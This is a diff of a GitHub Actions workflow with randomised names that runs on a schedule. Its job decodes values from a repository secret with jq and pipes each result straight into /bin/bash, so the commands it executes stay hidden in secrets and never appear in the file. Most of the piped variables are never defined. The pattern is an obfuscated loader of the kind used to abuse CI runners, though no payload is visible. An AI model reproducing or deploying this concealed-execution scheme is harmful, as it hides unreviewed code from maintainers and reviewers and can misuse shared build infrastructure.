@@ -1,10 +1,9 @@
 name: sunxinniang4817
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 4/6 * * *'
-jobs:  # 394
+    - cron: '7 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +11,14 @@ jobs:  # 394
       - uses: actions/checkout@v4
       - name: sunxinniang4817
         env:
-          r15: ${{ secrets.r15 }}
+          sh3: ${{ secrets.sh3 }}
         run: |
-          echo $r15 | jq -r .cxd36552 | /bin/bash
-          echo $zsqv12 | jq -r .zozmr63 | /bin/bash
-          echo $xkrt85083 | jq -r .er42603 | /bin/bash
-          echo $nctz05 | jq -r .wu17 | /bin/bash
-          echo $aqke156 | jq -r .ww01 | /bin/bash
-          echo $njhz44 | jq -r .xcn47 | /bin/bash
-          echo $bdzs7736 | jq -r .peth1656 | /bin/bash
-          echo $rmog764 | jq -r .dl3640 | /bin/bash
-          echo $qtp15 | jq -r .xbse32 | /bin/bash
-          echo $ud8 | jq -r .wecby02 | /bin/bash
-          echo $zqw9 | jq -r .hrsw5 | /bin/bash
+          echo $sh3 | jq -r .ka73734 | /bin/bash
+          echo $fbt70 | jq -r .vd972 | /bin/bash
+          echo $fiktd70 | jq -r .peq4 | /bin/bash
+          echo $moiqw9 | jq -r .zxl0862 | /bin/bash
+          echo $rpp5 | jq -r .r4 | /bin/bash
+          echo $jbogm2 | jq -r .s1040 | /bin/bash
+          echo $syc54824 | jq -r .fbh4805 | /bin/bash
+          echo $ya51 | jq -r .m945 | /bin/bash
 
